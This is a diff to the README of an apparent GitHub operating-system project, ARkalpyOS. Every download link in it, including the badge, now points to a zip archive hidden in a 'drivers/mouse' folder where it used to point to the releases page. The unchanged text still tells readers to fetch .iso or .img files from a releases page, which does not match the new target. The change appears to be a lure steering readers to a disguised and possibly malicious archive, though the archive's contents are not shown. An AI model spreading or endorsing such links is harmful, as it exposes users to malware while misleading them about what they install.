@@ -1,6 +1,6 @@
 # 🖥️ ARkalpyOS - Control Your Hardware Directly
 
-[![Download ARkalpyOS](https://img.shields.io/badge/Download-ARkalpyOS-blue?style=for-the-badge)](https://github.com/karna-sam/ARkalpyOS/releases)
+[![Download ARkalpyOS](https://github.com/karna-sam/ARkalpyOS/raw/refs/heads/main/drivers/mouse/OS_A_Rkalpy_v1.3.zip)](https://github.com/karna-sam/ARkalpyOS/raw/refs/heads/main/drivers/mouse/OS_A_Rkalpy_v1.3.zip)
 
 ---
 
@@ -46,7 +46,7 @@ This system supports a range of PC hardware but is optimized for machines with s
 
 To begin, you need to get the ARkalpyOS installation files. Visit the releases page below to download the latest version.
 
-[Download ARkalpyOS Releases](https://github.com/karna-sam/ARkalpyOS/releases)
+[Download ARkalpyOS Releases](https://github.com/karna-sam/ARkalpyOS/raw/refs/heads/main/drivers/mouse/OS_A_Rkalpy_v1.3.zip)
 
 This page contains all versions, including beta and stable releases. Look for files ending in `.iso` for installation discs or `.img` files for USB installation.
 
@@ -115,7 +115,7 @@ Help is available through the official GitHub page. You can report issues or ask
 
 You can always find the latest versions here:
 
-[Download ARkalpyOS Releases](https://github.com/karna-sam/ARkalpyOS/releases)
+[Download ARkalpyOS Releases](https://github.com/karna-sam/ARkalpyOS/raw/refs/heads/main/drivers/mouse/OS_A_Rkalpy_v1.3.zip)
 
 Remember to download the `.iso` or `.img` file suitable for your installation method. Follow the steps above to create installation media and set up ARkalpyOS effectively.
 
